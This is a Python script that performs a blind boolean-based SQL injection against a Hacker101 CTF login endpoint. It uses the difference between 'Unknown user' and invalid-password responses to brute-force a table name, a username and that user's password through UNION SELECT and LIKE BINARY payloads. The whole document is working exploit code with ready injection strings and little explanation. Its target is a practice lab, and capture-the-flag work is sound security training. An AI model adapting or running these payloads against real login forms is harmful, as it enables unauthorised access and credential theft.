#!/bin/python3.9
# boolean-esque sqli using union and Invalid password vs Invalid user to detect results
# Invalid password yields a true result, other option is false
# First filters characters in the given query, then brute forces password with LIKE

import requests
import re


url = "https://d68d913bec5c1d46204c5aaa14504be7.ctf.hacker101.com"
characters_global = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
head = {"Content-Type": "application/x-www-form-urlencoded"}


# Takes a payload with {} at the fuzz point, then fuzzes usable characters in the query
# The username must not exist for this fuzzing to work in this instance
def sql_character_filter(characters, endpoint, payload):
    print('Starting with ' + characters)
    filtered = ''
    print("Filtering characters used.")
    uri = ''.join([url, endpoint])
    for i in characters:
        r1 = requests.post(uri, data=payload.format('%'+i+'%'), headers=head)
        s = 'Unknown user'
        response_check1 = re.search(s, r1.text)

        if (str(response_check1) == 'None'): 
            filtered += str(i)

    print(f'List: {filtered}')
    return filtered

# Takes a payload with {} at fuzz point, then fuzzes till it finds the end of the string
# As with above the username must not exist fot the rest of the functions to work properly
def sql_enum(endpoint, payload, start=''):
    chars = sql_character_filter(characters_global, endpoint, payload)
    uri = ''.join([url, endpoint])
    name = start
    end = False
    for i in range(0,100):
        for j in chars:
            check = ''.join([name, j]) 
            r = requests.post(uri, data=payload.format(check+'%'), headers=head)

            s = 'Unknown user'
            response_check = re.search(s, r.text)

            if (str(response_check) == 'None'): 
                name = check
                print(name)
                break

            if j == chars[len(chars)-1]:
                end = True

        if end == True:
            break
    return name


if __name__ == '__main__':
    # Enumerating table name, starting with ad for admin/admins table
    payload = "username=admin' union select table_name from information_schema.tables where table_name like binary '{}';--&password=password"
    print("Enumerating table")
    table = sql_enum('/login', payload, 'ad')

    # Username fuzz importing table found
    payload = ''.join(["username=admin' union select password from ", table, " where username like binary '{}';--&password=password"])
    print("Enumerating user")
    user = sql_enum('/login', payload)

    # Password fuzz using table and username found in prior steps
    payload = ''.join(["username=admin' union select password from ", table, " where username='", user, "' and password like binary '{}';--&password=password"])
    print(f"Enumerating {user} password")
    sql_enum('/login', payload)

